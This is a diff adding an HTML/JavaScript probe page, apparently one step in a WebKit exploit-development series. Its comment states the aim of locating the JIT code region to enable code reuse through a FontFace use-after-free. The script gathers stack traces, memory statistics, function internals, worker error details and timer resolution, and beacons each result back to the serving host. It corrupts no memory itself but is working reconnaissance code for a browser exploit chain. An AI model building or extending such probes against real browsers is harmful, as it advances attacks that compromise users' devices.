@@ -1,0 +1,317 @@
+<!--
+  p603: JIT region detection + code pointer leak search
+
+  JIT is confirmed active (p602). JIT code lives in a separate executable
+  memory region. Finding its address is the key to code-reuse via FontFace UAF.
+
+  STRATEGY:
+  1. Error.stack format — older WebKit sometimes leaks native frame addresses
+  2. Function memory footprint — compile large vs small functions, measure delta
+  3. performance.memory — if available, reveals heap/JIT sizes
+  4. JSC internal object layout probing — toString/valueOf on exotic objects
+  5. Stack trace from JIT'd vs interpreted functions — format differences
+  6. Worker error propagation — workers might leak different info
+
+  CRASH_CLASS: LOW (no memory corruption, just information gathering)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p603</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P603-JIT-REGION-DETECT');
+
+  // === SECTION A: Error.stack format analysis ===
+  b('SEC-A:ERROR-STACK');
+
+  // A1: Basic error stack
+  try {
+    var e = new Error('test');
+    var stack = e.stack || '';
+    // Send first 300 chars
+    b('STACK-BASIC:'+stack.substring(0,300));
+  } catch(ex){ b('STACK-ERR:'+ex.message); }
+
+  // A2: Stack from nested call
+  function depth3(){ return new Error('d3').stack; }
+  function depth2(){ return depth3(); }
+  function depth1(){ return depth2(); }
+  try {
+    var nested = depth1() || '';
+    b('STACK-NESTED:'+nested.substring(0,400));
+  } catch(ex){ b('STACK-NESTED-ERR:'+ex.message); }
+
+  // A3: Stack from JIT'd function (warm it up first)
+  function jitFunc(n){
+    var s = 0;
+    for(var i = 0; i < n; i++) s += i;
+    if(n === -1) return new Error('jit').stack;
+    return s;
+  }
+  // Warm up to trigger JIT
+  for(var i = 0; i < 10000; i++) jitFunc(100);
+  try {
+    var jitStack = jitFunc(-1) || '';
+    b('STACK-JIT:'+jitStack.substring(0,400));
+  } catch(ex){ b('STACK-JIT-ERR:'+ex.message); }
+
+  // A4: Stack from thrown exception in JIT'd code
+  function jitThrow(n){
+    var s = 0;
+    for(var i = 0; i < n; i++){
+      if(i === n-1) throw new Error('boom');
+      s += i;
+    }
+    return s;
+  }
+  for(var i = 0; i < 5000; i++){
+    try { jitThrow(100); } catch(e){}
+  }
+  try {
+    jitThrow(50);
+  } catch(ex){
+    b('STACK-THROW:'+(ex.stack||'').substring(0,400));
+  }
+
+  // A5: Stack with eval (sometimes shows different format)
+  try {
+    var evalStack = eval('new Error("eval").stack') || '';
+    b('STACK-EVAL:'+evalStack.substring(0,300));
+  } catch(ex){ b('STACK-EVAL-ERR:'+ex.message); }
+
+  // A6: Native function in stack (e.g. Array.prototype.map callback)
+  try {
+    var mapStack = '';
+    [1].map(function(){ mapStack = new Error('map').stack; });
+    b('STACK-MAP:'+(mapStack||'').substring(0,400));
+  } catch(ex){ b('STACK-MAP-ERR:'+ex.message); }
+
+  // A7: Promise rejection stack
+  try {
+    var pStack = '';
+    new Promise(function(res,rej){
+      pStack = new Error('promise').stack;
+      res();
+    });
+    b('STACK-PROMISE:'+(pStack||'').substring(0,300));
+  } catch(ex){ b('STACK-PROMISE-ERR:'+ex.message); }
+
+  // === SECTION B: performance APIs ===
+  b('SEC-B:PERF-API');
+
+  try {
+    b('PERF-NOW-TYPE:'+(typeof performance));
+    if(typeof performance !== 'undefined'){
+      b('PERF-NOW:'+performance.now());
+
+      // performance.memory (Chrome-specific but might exist)
+      if(performance.memory){
+        b('PERF-MEM:used='+performance.memory.usedJSHeapSize+
+          ',total='+performance.memory.totalJSHeapSize+
+          ',limit='+performance.memory.jsHeapSizeLimit);
+      } else {
+        b('PERF-MEM:missing');
+      }
+
+      // performance.measureUserAgentSpecificMemory (newer API)
+      if(typeof performance.measureUserAgentSpecificMemory === 'function'){
+        b('PERF-MEASURE-MEM:available');
+      } else {
+        b('PERF-MEASURE-MEM:missing');
+      }
+
+      // performance timing entries
+      var entries = performance.getEntriesByType ? performance.getEntriesByType('navigation') : [];
+      b('PERF-NAV-ENTRIES:'+entries.length);
+    }
+  } catch(ex){ b('PERF-ERR:'+ex.message); }
+
+  // === SECTION C: JIT memory footprint ===
+  b('SEC-C:JIT-FOOTPRINT');
+
+  // Create many distinct JIT'd functions to see if we can measure code growth
+  // Baseline: GC then measure
+  try {
+    // Force GC attempt
+    for(var i = 0; i < 50; i++){
+      var tmp = new ArrayBuffer(1024*1024);
+      tmp = null;
+    }
+  } catch(e){}
+
+  var t0 = Date.now();
+  var funcs = [];
+  // Create 500 distinct functions with unique code (forces separate JIT compilations)
+  for(var i = 0; i < 500; i++){
+    // Each function has unique constant to prevent deduplication
+    funcs.push(new Function('x', 'var c='+i+';var s=0;for(var j=0;j<x;j++)s+=j+c;return s;'));
+  }
+  var t1 = Date.now();
+  b('FUNC-CREATE:500 in '+(t1-t0)+'ms');
+
+  // Warm them all up to trigger JIT
+  var t2 = Date.now();
+  for(var i = 0; i < funcs.length; i++){
+    for(var w = 0; w < 200; w++) funcs[i](50);
+  }
+  var t3 = Date.now();
+  b('FUNC-WARMUP:500x200 in '+(t3-t2)+'ms');
+
+  // Check performance.memory after JIT compilation if available
+  try {
+    if(typeof performance !== 'undefined' && performance.memory){
+      b('PERF-MEM-AFTER:used='+performance.memory.usedJSHeapSize+
+        ',total='+performance.memory.totalJSHeapSize);
+    }
+  } catch(e){}
+
+  // === SECTION D: Function object internals ===
+  b('SEC-D:FUNC-INTERNALS');
+
+  // D1: Function properties
+  function testFunc(a,b,c){ return a+b+c; }
+  for(var w = 0; w < 5000; w++) testFunc(1,2,3);
+
+  try {
+    var props = Object.getOwnPropertyNames(testFunc);
+    b('FUNC-PROPS:'+props.join(','));
+  } catch(ex){ b('FUNC-PROPS-ERR:'+ex.message); }
+
+  // D2: Function descriptors
+  try {
+    for(var i = 0; i < props.length; i++){
+      var desc = Object.getOwnPropertyDescriptor(testFunc, props[i]);
+      var val = desc.value !== undefined ? String(desc.value).substring(0,80) : (desc.get ? 'getter' : 'none');
+      b('FUNC-DESC:'+props[i]+'='+val);
+    }
+  } catch(ex){ b('FUNC-DESC-ERR:'+ex.message); }
+
+  // D3: toString on various function types
+  try {
+    b('TOSTR-NORMAL:'+String(testFunc).substring(0,100));
+    b('TOSTR-NATIVE:'+String(Array.prototype.map).substring(0,100));
+    b('TOSTR-BOUND:'+String(testFunc.bind(null)).substring(0,100));
+    b('TOSTR-ARROW:'+String((function(){return ()=>1;})()).substring(0,100));
+    b('TOSTR-GEN:'+(function*(){}).toString().substring(0,100));
+  } catch(ex){ b('TOSTR-ERR:'+ex.message); }
+
+  // === SECTION E: Structured clone of functions (leak internal state?) ===
+  b('SEC-E:CLONE-LEAK');
+
+  try {
+    var cloned = structuredClone(testFunc);
+    b('CLONE-FUNC:'+typeof cloned);
+  } catch(ex){
+    // Expected to fail — functions aren't cloneable
+    b('CLONE-FUNC-ERR:'+ex.message);
+  }
+
+  // Clone of error with stack
+  try {
+    var err = new Error('clone-test');
+    var errClone = structuredClone({stack: err.stack, message: err.message});
+    b('CLONE-ERR:stack='+(errClone.stack||'').substring(0,200));
+  } catch(ex){ b('CLONE-ERR-ERR:'+ex.message); }
+
+  // === SECTION F: Worker error leak ===
+  b('SEC-F:WORKER-ERR');
+
+  try {
+    // Worker that generates a stack trace from JIT'd code
+    var wCode = [
+      'function jf(n){var s=0;for(var i=0;i<n;i++)s+=i;if(n===-1)throw new Error("wk");return s;}',
+      'for(var i=0;i<10000;i++)jf(100);',
+      'try{jf(-1);}catch(e){postMessage({stack:e.stack||"",msg:e.message});}'
+    ].join('\n');
+    var wBlob = new Blob([wCode], {type:'application/javascript'});
+    var worker = new Worker(URL.createObjectURL(wBlob));
+    worker.onmessage = function(ev){
+      b('WORKER-STACK:'+(ev.data.stack||'').substring(0,400));
+      worker.terminate();
+    };
+    worker.onerror = function(ev){
+      b('WORKER-ONERR:'+ev.message+' at '+ev.filename+':'+ev.lineno);
+      worker.terminate();
+    };
+  } catch(ex){ b('WORKER-ERR:'+ex.message); }
+
+  // === SECTION G: valueOf/Symbol.toPrimitive on special objects ===
+  b('SEC-G:COERCION');
+
+  // Coercing objects can sometimes trigger internal paths that leak info
+  try {
+    var sym = Symbol('test');
+    b('SYMBOL-DESC:'+sym.description);
+    b('SYMBOL-TOSTR:'+sym.toString());
+  } catch(ex){ b('SYMBOL-ERR:'+ex.message); }
+
+  try {
+    // Typed array buffer property
+    var ab = new ArrayBuffer(64);
+    var u8 = new Uint8Array(ab);
+    b('U8-BUFFER:'+(u8.buffer === ab));
+    b('U8-BYTEOFF:'+u8.byteOffset);
+    b('U8-BYTELEN:'+u8.byteLength);
+
+    // DataView on the buffer
+    var dv = new DataView(ab);
+    b('DV-BYTELEN:'+dv.byteLength);
+    b('DV-BYTEOFF:'+dv.byteOffset);
+    b('DV-BUFFER:'+(dv.buffer === ab));
+  } catch(ex){ b('COERCE-ERR:'+ex.message); }
+
+  // === SECTION H: RegExp internals (JIT compiles regexps too) ===
+  b('SEC-H:REGEXP');
+
+  try {
+    var re = /test(\d+)/g;
+    // Warm up regexp JIT
+    for(var i = 0; i < 5000; i++) re.test('test'+i);
+    b('RE-PROPS:'+Object.getOwnPropertyNames(re).join(','));
+    b('RE-SOURCE:'+re.source);
+    b('RE-FLAGS:'+re.flags);
+    b('RE-TOSTR:'+re.toString());
+  } catch(ex){ b('RE-ERR:'+ex.message); }
+
+  // === SECTION I: Timing precision ===
+  b('SEC-I:TIMING');
+
+  try {
+    // What's the resolution of performance.now()?
+    var times = [];
+    var last = performance.now();
+    for(var i = 0; i < 100; i++){
+      var now = performance.now();
+      if(now !== last){
+        times.push(now - last);
+        last = now;
+      }
+      // Busy wait a tiny bit
+      for(var j = 0; j < 1000; j++){}
+    }
+    var minDelta = times.length > 0 ? Math.min.apply(null, times) : -1;
+    var maxDelta = times.length > 0 ? Math.max.apply(null, times) : -1;
+    b('TIMER-RESOLUTION:changes='+times.length+',min='+minDelta.toFixed(6)+
+      ',max='+maxDelta.toFixed(6));
+
+    // Date.now resolution
+    var dtimes = [];
+    var dlast = Date.now();
+    for(var i = 0; i < 200; i++){
+      var dnow = Date.now();
+      if(dnow !== dlast){
+        dtimes.push(dnow - dlast);
+        dlast = dnow;
+      }
+      for(var j = 0; j < 5000; j++){}
+    }
+    var dmin = dtimes.length > 0 ? Math.min.apply(null, dtimes) : -1;
+    b('DATE-RESOLUTION:changes='+dtimes.length+',minDelta='+dmin+'ms');
+  } catch(ex){ b('TIMER-ERR:'+ex.message); }
+
+  // Wait for worker response then complete
+  setTimeout(function(){ b('P603-COMPLETE'); }, 2000);
+}
+
+setTimeout(main, 100);
+</script></head><body>p603: JIT region detect</body></html>
